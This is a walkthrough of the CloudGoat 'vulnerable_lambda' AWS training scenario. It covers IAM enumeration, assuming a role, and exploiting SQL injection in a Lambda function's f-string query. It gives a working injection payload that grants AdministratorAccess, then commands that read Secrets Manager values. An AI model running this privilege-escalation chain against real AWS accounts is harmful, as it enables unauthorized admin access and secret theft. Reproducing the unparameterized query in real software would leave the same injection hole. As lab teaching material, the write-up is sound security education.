In this scenario, you start as the 'Bilbo' user. You will assume a role with more privileges, discover a lambda function that applies policies to users, and exploit a vulnerability in the function to escalate the privileges of the "Bilbo" user in order to search for secrets.

Scenario link - [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/vulnerable_lambda/README.md)

Enumerating the user:
```
The below command gives the information about the user, think of it like a "whoami" command in Linux/Windows:
aws sts get-caller-identity --profile bilbo
```
Getting policies attached to the User: 
```
aws --profile bilbo --region us-east-1 iam list-user-policies --user-name USER-NAME
```
![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/1892ef63-01b9-4b63-a455-ec4300cc0723)

Getting permissions attached to the that policy:
```
aws --profile bilbo --region us-east-1 iam get-user-policy --user-name USER-NAME --policy-name POLICY-NAME
```
![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/cd7bec60-ae32-410b-91da-e612249c4c45)

We can see the policy has a set of permissions. The first part of the permission tells that there is a role that we can assume (More on that later). 
The second part of the permission specifies that we have ability to get and list IAM related resources. 

```
iam:Get* permission provides read-only access to IAM information, it does not grant permissions to modify or delete IAM resources.

iam:List* is another wildcard permission that grants the ability to list (i.e., retrieve a collection of) IAM-related resources or entities.
  
The "iam:SimulatePrincipalPolicy" action in AWS IAM allows you to simulate the effect of a specific IAM policy attached to a principal (such as a user, group, or role) against a specified set of resources and actions.
This is particularly useful in testing environments.
```
Enumerating the Role:

A role is an IAM Identity. It is similar to IAM User that has policies attached to it. It is generally used on a temporary basis. A role can be attached to users or AWS services which can then be assumed by them to do certain operations.  If a role gets assumed by someone/something then AWS generates temporary security credentials. 

When we create a role, we create two policies:
- Trust Policy: Specifies who can assume that role. 
- Permissions Policy: What resources can be accessed using that role.

Listing the roles:
```
aws --profile bilbo --region us-east-1 iam list-roles | grep cg-
```

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/ff4412e4-f0bb-4de1-a3b6-edd001fe9e77)

Listing the policies attached to the role:
```
aws --profile bilbo --region us-east-1 iam list-role-policies --role-name ROLE-NAME
```

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/3eeaca98-663b-49d8-af99-c23e50159e2a)

Listing the permissions attached to that policy
```
aws --profile bilbo --region us-east-1 iam get-role-policy --role-name cg-lambda-invoker-vulnerable_lambda_cgid865tocmous --policy-name lambda-invoker
```

```JSON
{
    "RoleName": "cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt",
    "PolicyName": "lambda-invoker",
    "PolicyDocument": {
        "Statement": [
            {
                "Action": [
                    "lambda:ListFunctionEventInvokeConfigs",
                    "lambda:InvokeFunction",
                    "lambda:ListTags",
                    "lambda:GetFunction",
                    "lambda:GetPolicy"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
                    "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1"
                ]
            },
            {
                "Action": [
                    "lambda:ListFunctions",
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ],
        "Version": "2012-10-17"
    }
}
```

We can see that the role permission has several new Lambda actions that could lead us to some interesting resources. 

Assuming the role:
```
aws --profile bilbo --region us-east-1 sts assume-role --role-arn ARN-ROLE --role-session WATEVER
```
Configure the new profile with the new creds along with the Session Token. 

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/8e170db7-4636-466b-b18c-9f2930ee9334)

Now that we assumed this role, our next task is to list all Lambda functions.

This command will show you all lambda functions:
```
aws --profile PROFILE-NAME lambda list-function
```
![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/78daf48e-64a7-4e95-8261-8ca5b8b999d5)

This command is used to retrieve information about a Lambda function:
```
aws --profile PROFILE-NAME --region us-east-1 lambda get-function --function-name FUNC
```
To fully understand what this Lambda function can do, let’s download the source code. This can be found in the Code.Location attribute when calling lambda:GetFunction.

```JSON
{
    "Configuration": {
        "FunctionName": "vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
        "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
        "Runtime": "python3.9",
        "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
        "Handler": "main.handler",
        "CodeSize": 991559,
        "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2023-02-19T19:11:38.016+0000",
        "CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "5cc6a0d3-c4be-4a66-abcc-4601b55883e0",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://REDACTED"
    },
    "Tags": {
        "Name": "cg-vulnerable_lambda_cgidlbywef16bt",
        "Scenario": "vulnerable-lambda",
        "Stack": "CloudGoat"
    }
}
```

The “main.py” file is where the function handler exists for this particular lambda, and if ever you’re unsure of where the function Handler is, the same API call that returns the URL for the source code also returns the “Handler” field. 

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/d6bb39cb-da03-4cc7-9874-033ec60062c7)

```python
import boto3
from sqlite_utils import Database

db = Database("my_database.db")
iam_client = boto3.client('iam')


# db["policies"].insert_all([
#     {"policy_name": "AmazonSNSReadOnlyAccess", "public": 'True'}, 
#     {"policy_name": "AmazonRDSReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AWSLambda_ReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonS3ReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonGlacierReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonRoute53DomainsReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AdministratorAccess", "public": 'False'}
# ])


def handler(event, context):
    target_policys = event['policy_names']
    user_name = event['user_name']
    print(f"target policys are : {target_policys}")

    for policy in target_policys:
        statement_returns_valid_policy = False
        statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"
        for row in db.query(statement):
            statement_returns_valid_policy = True
            print(f"applying {row['policy_name']} to {user_name}")
            response = iam_client.attach_user_policy(
                UserName=user_name,
                PolicyArn=f"arn:aws:iam::aws:policy/{row['policy_name']}"
            )
            print("result: " + str(response['ResponseMetadata']['HTTPStatusCode']))

        if not statement_returns_valid_policy:
            invalid_policy_statement = f"{policy} is not an approved policy, please only choose from approved " \
                                       f"policies and don't cheat. :) "
            print(invalid_policy_statement)
            return invalid_policy_statement

    return "All managed policies were applied as expected."


if __name__ == "__main__":
    payload = {
        "policy_names": [
            "AmazonSNSReadOnlyAccess",
            "AWSLambda_ReadOnlyAccess"
        ],
        "user_name": "cg-bilbo-user"
    }
    print(handler(payload, 'uselessinfo'))
```

This Lambda handler takes two arguments upon invocation, user_name and policy_names. 
Using string formatting to dynamically build a SQL statement without the use of prepared statements opens up the application logic to risk of SQL injection attacks. Directly using user input that is controllable by an attacker without any form of sanitization drastically increases that risk. 

We can leverage this to terminate the following SQL statement because the value of policy is attacker-controlled, removing the requirement of public = 'True' and invoke the lambda function in order to escalate our privileges. 

The following command will send a SQL injection payload to the lambda function:
```
aws --profile robo --region REGION lambda invoke --function-name func-name --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": "USERNAME"}' out.txt
```

![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/77ad8313-163b-401e-816d-747de14a9dfb)

Now that Bilbo is an admin, use credentials for that user to list secrets from `secretsmanager`.

This command will list all the secrets in secretsmanager:
```
aws --profile bilbo --region us-east-1 secretsmanager list-secrets
```

This command will get the value for a specific secret:
```
aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]
```
![image](https://github.com/sabarish20/Security-in-AWS/assets/85452305/1b57c314-77cf-4dd5-92a4-1baacc890cdb)

